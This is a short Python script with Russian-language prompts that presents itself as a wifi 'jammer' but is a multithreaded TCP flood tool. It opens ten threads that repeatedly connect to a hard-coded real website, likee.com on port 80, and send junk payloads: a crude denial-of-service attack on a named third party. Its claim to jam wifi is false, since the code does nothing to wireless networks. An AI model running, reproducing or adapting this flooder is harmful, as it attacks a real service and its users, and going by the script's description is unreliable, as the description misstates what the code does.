import socket
import threading
import time
import random
import colorama
from colorama import Fore
import os


os.system("clear")


colorama.init()

print (Fore.YELLOW + "")


print ("Глушит интернет, используёте на свой страх и риск")

print ("")

wificraker = input("Нажмите Enter чтобы глушить wifi")
print ("Глушим wifi")

time.sleep(1)
#hello world


TARGET_HOST = "likee.com"
TARGET_PORT = 80
NUM_THREADS = 10
PACKETS_PER_THREAD = 1000
PAYLOAD_SIZE = 4024
USE_UDP = False

def flood(host, port, packets_per_thread, payload_size, use_udp):
    sock_type = socket.SOCK_DGRAM if use_udp else socket.SOCK_STREAM
    protocol = socket.AF_INET
    for i in range(packets_per_thread):
        try:
            with socket.socket(protocol, sock_type) as sock:
                if not use_udp:
                    sock.connect((host, port))
                payload = b"A" * payload_size
                sock.sendto(payload, (host, port)) if use_udp else sock.sendall(payload)
                print(f"{'UDP' if use_udp else 'TCP'}: Отправлен пакет {i+1}")
        except socket.error as e:
            print(f"{'UDP' if use_udp else 'TCP'}: Ошибка сокета: {e}")
            break
        except Exception as e:
            print(f"{'UDP' if use_udp else 'TCP'}: Другая ошибка: {e}")
            break
        time.sleep(0.01)

threads = []
print(f"Начинаем отправку пакетов на {TARGET_HOST}:{TARGET_PORT}...")

for i in range(NUM_THREADS):
    thread = threading.Thread(target=flood, args=(TARGET_HOST, TARGET_PORT, PACKETS_PER_THREAD, PAYLOAD_SIZE, USE_UDP))
    print(f"Запущен {'UDP' if USE_UDP else 'TCP'} поток {i+1}")
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

print("Отправка пакетов завершена.")




    
